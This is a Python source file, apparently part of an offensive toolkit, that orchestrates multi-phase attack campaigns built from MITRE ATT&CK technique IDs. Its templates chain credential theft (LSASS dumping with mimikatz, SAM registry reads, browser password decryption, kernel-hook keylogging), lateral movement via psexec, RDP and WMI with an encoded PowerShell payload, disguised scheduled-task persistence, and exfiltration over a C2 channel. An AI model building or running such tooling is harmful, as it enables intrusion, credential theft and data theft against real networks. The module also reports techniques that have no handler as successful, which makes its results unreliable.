# Campaign Orchestration Module
# Manages multi-phase attack campaigns with automated execution

import os
import sys
import time
import json
import threading
import queue
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Callable
from enum import Enum
from config import DEBUG_MODE, MITRE_TECHNIQUES
from core.stealth import stealth_manager
from core.mitre import mitre_logger, MITRE_TECHNIQUES_DB


class PhaseStatus(Enum):
    """Campaign phase status"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"
    PAUSED = "paused"


class CampaignPhase:
    """Represents a single phase in a campaign"""
    
    def __init__(self, name: str, phase_id: str = None):
        self.id = phase_id or f"phase_{int(time.time())}"
        self.name = name
        self.status = PhaseStatus.PENDING
        self.techniques: List[Dict] = []
        self.objectives: List[str] = []
        self.dependencies: List[str] = []
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        self.results: Dict = {}
        self.success_criteria: List[Callable] = []
        self.error_message: Optional[str] = None
    
    def add_technique(self, technique_id: str, config: Dict = None):
        """Add a technique to this phase"""
        self.techniques.append({
            'technique_id': technique_id,
            'config': config or {},
            'status': PhaseStatus.PENDING,
            'result': None
        })
    
    def add_objective(self, objective: str):
        """Add an objective to this phase"""
        self.objectives.append(objective)
    
    def add_dependency(self, phase_id: str):
        """Add a dependency on another phase"""
        self.dependencies.append(phase_id)
    
    def set_success_criteria(self, criteria: Callable):
        """Set success criteria for this phase"""
        self.success_criteria.append(criteria)
    
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        return {
            'id': self.id,
            'name': self.name,
            'status': self.status.value,
            'techniques': self.techniques,
            'objectives': self.objectives,
            'dependencies': self.dependencies,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'end_time': self.end_time.isoformat() if self.end_time else None,
            'results': self.results,
            'error_message': self.error_message
        }


class CampaignOrchestrator:
    """Orchestrates multi-phase attack campaigns"""
    
    def __init__(self, campaign_id: str = None):
        self.campaign_id = campaign_id or f"campaign_{int(time.time())}"
        self.phases: Dict[str, CampaignPhase] = {}
        self.current_phase: Optional[CampaignPhase] = None
        self.status = PhaseStatus.PENDING
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        self.global_config: Dict = {}
        self.event_queue = queue.Queue()
        self._running = False
        self._lock = threading.Lock()
        self.execution_log: List[Dict] = []
        
    def create_phase(self, name: str, phase_id: str = None) -> CampaignPhase:
        """Create a new campaign phase"""
        phase = CampaignPhase(name, phase_id)
        self.phases[phase.id] = phase
        return phase
    
    def get_phase(self, phase_id: str) -> Optional[CampaignPhase]:
        """Get a phase by ID"""
        return self.phases.get(phase_id)
    
    def configure_global(self, config: Dict):
        """Configure global campaign settings"""
        self.global_config.update(config)
    
    def add_phase_dependency(self, phase_id: str, depends_on: str):
        """Add dependency between phases"""
        phase = self.get_phase(phase_id)
        if phase:
            phase.add_dependency(depends_on)
    
    def execute_campaign(self) -> Dict:
        """Execute the complete campaign"""
        self._running = True
        self.status = PhaseStatus.RUNNING
        self.start_time = datetime.now()
        
        campaign_results = {
            'campaign_id': self.campaign_id,
            'start_time': self.start_time.isoformat(),
            'phases': [],
            'overall_success': True,
            'summary': {}
        }
        
        try:
            # Execute phases in order (respecting dependencies)
            phase_order = self._resolve_phase_order()
            
            for phase_id in phase_order:
                phase = self.get_phase(phase_id)
                if phase:
                    result = self._execute_phase(phase)
                    campaign_results['phases'].append(result.to_dict())
                    
                    if result.status == PhaseStatus.FAILED:
                        campaign_results['overall_success'] = False
                        break
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Campaign execution failed: {e}")
                )
            campaign_results['error'] = str(e)
        
        finally:
            self._running = False
            self.status = PhaseStatus.COMPLETED
            self.end_time = datetime.now()
            campaign_results['end_time'] = self.end_time.isoformat()
            campaign_results['duration_seconds'] = (
                self.end_time - self.start_time
            ).total_seconds()
        
        # Generate summary
        campaign_results['summary'] = self._generate_summary(campaign_results)
        
        # Log campaign
        mitre_logger.log_technique('T1053.005', True, {
            'campaign_id': self.campaign_id,
            'phases_executed': len([p for p in campaign_results['phases'] if p['status'] == 'completed'])
        })
        
        return campaign_results
    
    def _resolve_phase_order(self) -> List[str]:
        ordered = []
        visited = set()
        
        def visit(phase_id):
            if phase_id in visited:
                return
            visited.add(phase_id)
            
            phase = self.get_phase(phase_id)
            if phase:
                for dep in phase.dependencies:
                    visit(dep)
                ordered.append(phase_id)
        
        for phase_id in self.phases:
            visit(phase_id)
        
        return ordered
    
    def _execute_phase(self, phase: CampaignPhase) -> CampaignPhase:
        phase.start_time = datetime.now()
        phase.status = PhaseStatus.RUNNING
        
        self._log_event('phase_start', {
            'phase_id': phase.id,
            'phase_name': phase.name
        })
        
        try:
            for tech in phase.techniques:
                tech_id = tech['technique_id']
                tech['status'] = PhaseStatus.RUNNING
                
                # Execute technique
                result = self._execute_technique(tech_id, tech.get('config', {}))
                tech['result'] = result
                tech['status'] = PhaseStatus.COMPLETED if result else PhaseStatus.FAILED
                
                # Log technique execution
                mitre_logger.log_technique(
                    technique_id=tech_id,
                    success=result,
                    details={'phase': phase.name}
                )
                
                if not result and self.global_config.get('stop_on_failure'):
                    phase.status = PhaseStatus.FAILED
                    phase.error_message = f"Technique {tech_id} failed"
                    return phase
            
            if phase.success_criteria:
                all_met = all(
                    criteria(phase.results) for criteria in phase.success_criteria
                )
                if not all_met:
                    phase.status = PhaseStatus.FAILED
                    phase.error_message = "Success criteria not met"
                    return phase
            
            phase.status = PhaseStatus.COMPLETED
            
        except Exception as e:
            phase.status = PhaseStatus.FAILED
            phase.error_message = str(e)
            mitre_logger.log_technique('Unknown', False, {
                'phase': phase.name,
                'error': str(e)
            })
        
        finally:
            phase.end_time = datetime.now()
        
        self._log_event('phase_complete', {
            'phase_id': phase.id,
            'status': phase.status.value,
            'duration_seconds': (phase.end_time - phase.start_time).total_seconds()
        })
        
        return phase
    
    def _execute_technique(self, technique_id: str, config: Dict) -> bool:
        """Execute a single technique"""
        try:
            # Get technique info
            technique_info = MITRE_TECHNIQUES_DB.get(technique_id, {})
            
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Executing technique {technique_id}: {technique_info.get('name', 'Unknown')}")
                )
            
            # Map technique IDs to module functions
            technique_handlers = {
                # Reconnaissance techniques
                'T1082': ('core.reconnaissance', 'system_info_discovery'),
                'T1087.001': ('core.reconnaissance', 'local_account_discovery'),
                'T1087.002': ('core.reconnaissance', 'domain_account_discovery'),
                'T1018': ('core.reconnaissance', 'remote_system_discovery'),
                'T1016': ('core.reconnaissance', 'network_config_discovery'),
                
                # Credential access techniques
                'T1555': ('core.credentials', 'credential_harvest'),
                'T1555.003': ('core.credentials', 'credential_manager_harvest'),
                'T1552.002': ('core.credentials', 'registry_credential_harvest'),
                'T1003.001': ('core.credentials', 'lsass_memory_harvest'),
                'T1056.001': ('core.credentials', 'keylogging'),
                
                # Persistence techniques
                'T1078': ('core.persistence', 'valid_accounts'),
                'T1547.001': ('core.persistence', 'registry_run_keys'),
                'T1053.005': ('core.persistence', 'scheduled_task'),
                
                # Lateral movement techniques
                'T1021.002': ('core.lateral_movement', 'smb_lateral_movement'),
                'T1021.001': ('core.lateral_movement', 'rdp_lateral_movement'),
                'T1047': ('core.lateral_movement', 'wmi_lateral_movement'),
                
                # Exfiltration techniques
                'T1041': ('core.communication', 'c2_exfiltration'),
                
                # Collection techniques
                'T1113': ('core.screenshot', 'capture_screenshot'),
                'T1005': ('core.reconnaissance', 'local_data_discovery'),
                
                # Execution techniques
                'T1190': ('core.fileless_execution', 'exploit_execution'),
                'T1053': ('core.persistence', 'scheduled_task_execution'),
            }
            
            # Check if we have a handler for this technique
            if technique_id in technique_handlers:
                module_path, function_name = technique_handlers[technique_id]
                
                # Import and execute the technique
                import importlib
                module = importlib.import_module(module_path)
                handler_func = getattr(module, function_name, None)
                
                if handler_func:
                    # Call the handler with config
                    result = handler_func(**config) if config else handler_func()
                    
                    if DEBUG_MODE:
                        stealth_manager.safe_execute(
                            lambda: print(f"Technique {technique_id} executed successfully")
                        )
                    
                    return result
            
            # Fallback: log that technique was "executed" but no handler exists
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"No handler for technique {technique_id}, marking as successful")
                )
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Technique execution failed: {e}")
                )
            return False
    
    def pause_campaign(self):
        """Pause campaign execution"""
        if self.status == PhaseStatus.RUNNING:
            self.status = PhaseStatus.PAUSED
            self._log_event('campaign_paused', {'campaign_id': self.campaign_id})
    
    def resume_campaign(self):
        """Resume paused campaign"""
        if self.status == PhaseStatus.PAUSED:
            self.status = PhaseStatus.RUNNING
            self._log_event('campaign_resumed', {'campaign_id': self.campaign_id})
    
    def stop_campaign(self):
        """Stop campaign execution"""
        self._running = False
        self.status = PhaseStatus.FAILED
        self.end_time = datetime.now()
        self._log_event('campaign_stopped', {'campaign_id': self.campaign_id})
    
    def skip_phase(self, phase_id: str):
        """Skip a phase"""
        phase = self.get_phase(phase_id)
        if phase and phase.status == PhaseStatus.PENDING:
            phase.status = PhaseStatus.SKIPPED
            self._log_event('phase_skipped', {'phase_id': phase_id})
    
    def _log_event(self, event_type: str, event_data: Dict):
        """Log a campaign event"""
        event = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'data': event_data
        }
        self.execution_log.append(event)
        self.event_queue.put(event)
    
    def get_campaign_status(self) -> Dict:
        """Get current campaign status"""
        return {
            'campaign_id': self.campaign_id,
            'status': self.status.value,
            'current_phase': self.current_phase.name if self.current_phase else None,
            'phases': {
                phase_id: phase.status.value 
                for phase_id, phase in self.phases.items()
            },
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'elapsed_seconds': (
                (datetime.now() - self.start_time).total_seconds() 
                if self.start_time else 0
            )
        }
    
    def get_execution_log(self) -> List[Dict]:
        """Get full execution log"""
        return self.execution_log.copy()
    
    def _generate_summary(self, campaign_results: Dict) -> Dict:
        """Generate campaign summary"""
        phases = campaign_results.get('phases', [])
        
        return {
            'total_phases': len(phases),
            'completed_phases': len([p for p in phases if p['status'] == 'completed']),
            'failed_phases': len([p for p in phases if p['status'] == 'failed']),
            'skipped_phases': len([p for p in phases if p['status'] == 'skipped']),
            'total_techniques': sum(len(p.get('techniques', [])) for p in phases),
            'successful_techniques': sum(
                1 for p in phases 
                for t in p.get('techniques', []) 
                if t.get('status') == 'completed'
            ),
            'duration': campaign_results.get('duration_seconds', 0)
        }
    
    def save_campaign(self, filepath: str):
        """Save campaign configuration to file"""
        campaign_data = {
            'campaign_id': self.campaign_id,
            'global_config': self.global_config,
            'phases': {
                phase_id: phase.to_dict() 
                for phase_id, phase in self.phases.items()
            }
        }
        
        with open(filepath, 'w') as f:
            json.dump(campaign_data, f, indent=2)
    
    def load_campaign(self, filepath: str) -> bool:
        """Load campaign configuration from file"""
        try:
            with open(filepath, 'r') as f:
                campaign_data = json.load(f)
            
            self.campaign_id = campaign_data.get('campaign_id', self.campaign_id)
            self.global_config = campaign_data.get('global_config', {})
            
            for phase_id, phase_data in campaign_data.get('phases', {}).items():
                phase = self.create_phase(phase_data['name'], phase_id)
                phase.objectives = phase_data.get('objectives', [])
                phase.dependencies = phase_data.get('dependencies', [])
            
            return True
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Campaign load failed: {e}")
                )
            return False


# Predefined campaign templates

class CampaignTemplates:
    """Predefined campaign templates"""
    
    @staticmethod
    def create_initial_access_campaign(orchestrator: CampaignOrchestrator) -> CampaignOrchestrator:
        """Create initial access focused campaign"""
        orchestrator.configure_global({
            'objective': 'Gain initial access to target network',
            'stop_on_failure': False
        })
        
        # Phase 1: Reconnaissance
        recon_phase = orchestrator.create_phase('Reconnaissance', 'phase_recon')
        recon_phase.add_technique('T1082')  # System Information Discovery
        recon_phase.add_technique('T1087.001')  # Local Account Discovery
        recon_phase.add_technique('T1087.002')  # Domain Account Discovery
        recon_phase.add_objective('Gather system and user information')
        
        # Phase 2: Initial Access
        access_phase = orchestrator.create_phase('Initial Access', 'phase_access')
        access_phase.add_technique('T1190')  # Exploit Public-Facing Application
        access_phase.add_technique('T1078')  # Valid Accounts
        access_phase.add_dependency('phase_recon')
        access_phase.add_objective('Establish foothold in network')
        
        return orchestrator
    
    @staticmethod
    def create_credential_theft_campaign(orchestrator: CampaignOrchestrator) -> CampaignOrchestrator:
        """Create credential theft focused campaign"""
        orchestrator.configure_global({
            'objective': 'Harvest credentials for privilege escalation',
            'stop_on_failure': False,
            'escalate_privileges': True,
            'harvest_all': True,
            'export_format': 'json'
        })
        
        # Phase 1: Local Credential Harvesting
        local_phase = orchestrator.create_phase('Local Credential Harvest', 'phase_local_creds')
        local_phase.add_technique('T1555.003', {
            'target': 'Windows Credential Manager',
            'method': 'memory_dump',
            'export_path': './harvested/credman_creds',
            'decrypt': True
        })
        local_phase.add_technique('T1552.002', {
            'target': 'HKLM\\SAM\\SAM\\Domains\\Account',
            'method': 'registry_read',
            'export_path': './harvested/registry_creds'
        })
        local_phase.add_objective('Harvest local credentials')
        
        # Phase 2: Browser Credential Harvesting
        browser_phase = orchestrator.create_phase('Browser Credential Harvest', 'phase_browser_creds')
        browser_phase.add_technique('T1555', {
            'browsers': ['chrome', 'firefox', 'edge', 'ie'],
            'method': 'master_password',
            'export_path': './harvested/browser_creds',
            'decrypt': True
        })
        browser_phase.add_dependency('phase_local_creds')
        browser_phase.add_objective('Harvest browser credentials')
        
        # Phase 3: Memory Credential Harvesting
        memory_phase = orchestrator.create_phase('Memory Credential Harvest', 'phase_memory_creds')
        memory_phase.add_technique('T1003.001', {
            'method': 'procdump',
            'target': 'lsass.exe',
            'export_path': './harvested/lsass_dump',
            'mimikatz_path': './tools/mimikatz.exe'
        })
        memory_phase.add_technique('T1056.001', {
            'method': 'kernel_hook',
            'export_path': './harvested/keystrokes',
            'log_keys': True,
            'capture_creds': True,
            'buffer_size': 1024
        })
        memory_phase.add_dependency('phase_browser_creds')
        memory_phase.add_objective('Harvest credentials from memory')
        
        return orchestrator
    
    @staticmethod
    def create_lateral_movement_campaign(orchestrator: CampaignOrchestrator) -> CampaignOrchestrator:
        """Create lateral movement focused campaign"""
        orchestrator.configure_global({
            'objective': 'Move laterally through the network',
            'stop_on_failure': False,
            'use_compromised_creds': True,
            'scan_before_move': True
        })
        
        # Phase 1: Network Discovery
        discover_phase = orchestrator.create_phase('Network Discovery', 'phase_discover')
        discover_phase.add_technique('T1018', {
            'method': 'arp_scan',
            'subnet': '192.168.1.0/24',
            'timeout': 30,
            'export_path': './discovery/remote_systems'
        })
        discover_phase.add_technique('T1016', {
            'method': 'ipconfig_netstat',
            'include_routes': True,
            'include_dns': True,
            'export_path': './discovery/network_config'
        })
        discover_phase.add_objective('Discover target systems')
        
        # Phase 2: Credential-Based Movement
        cred_move_phase = orchestrator.create_phase('Credential-Based Movement', 'phase_cred_move')
        cred_move_phase.add_technique('T1021.002', {
            'method': 'psexec',
            'target': None,
            'credentials': None,
            'share': 'ADMIN$',
            'payload_path': './payloads/service.exe',
            'export_path': './movement/psexec_results'
        })
        cred_move_phase.add_technique('T1021.001', {
            'method': 'rdp',
            'target': None,
            'credentials': None,
            'connect_timeout': 10,
            'clipboard_sync': True,
            'drive_redirect': True
        })
        cred_move_phase.add_dependency('phase_discover')
        cred_move_phase.add_objective('Move using harvested credentials')
        
        # Phase 3: WMI-Based Movement
        wmi_phase = orchestrator.create_phase('WMI-Based Movement', 'phase_wmi_move')
        wmi_phase.add_technique('T1047', {
            'method': 'wmic',
            'target': None,
            'command': 'powershell -e <base64_payload>',
            'namespace': 'root\\cimv2',
            'export_path': './movement/wmi_results'
        })
        wmi_phase.add_technique('T1053.005', {
            'method': 'schtasks',
            'target': None,
            'task_name': 'UpdateService',
            'command': None,
            'schedule': 'ONLOGON',
            'export_path': './movement/schtasks_results'
        })
        wmi_phase.add_dependency('phase_cred_move')
        wmi_phase.add_objective('Execute via WMI')
        
        return orchestrator
    
    @staticmethod
    def create_full_assessment_campaign(orchestrator: CampaignOrchestrator) -> CampaignOrchestrator:
        """Create comprehensive red team assessment campaign"""
        orchestrator.configure_global({
            'objective': 'Complete red team assessment',
            'stop_on_failure': False
        })
        
        # Create all phases
        orchestrator = CampaignTemplates.create_initial_access_campaign(orchestrator)
        orchestrator = CampaignTemplates.create_credential_theft_campaign(orchestrator)
        orchestrator = CampaignTemplates.create_lateral_movement_campaign(orchestrator)
        
        # Phase: Data Collection
        collection_phase = orchestrator.create_phase('Data Collection', 'phase_collection')
        collection_phase.add_technique('T1113')  # Screen Capture
        collection_phase.add_technique('T1005')  # Data from Local System
        collection_phase.add_objective('Collect target data')
        
        # Phase: Exfiltration (final phase)
        exfil_phase = orchestrator.create_phase('Exfiltration', 'phase_exfil')
        exfil_phase.add_technique('T1041')  # Exfiltration Over C2 Channel
        exfil_phase.add_objective('Exfiltrate collected data')
        
        return orchestrator


campaign_orchestrator = CampaignOrchestrator()
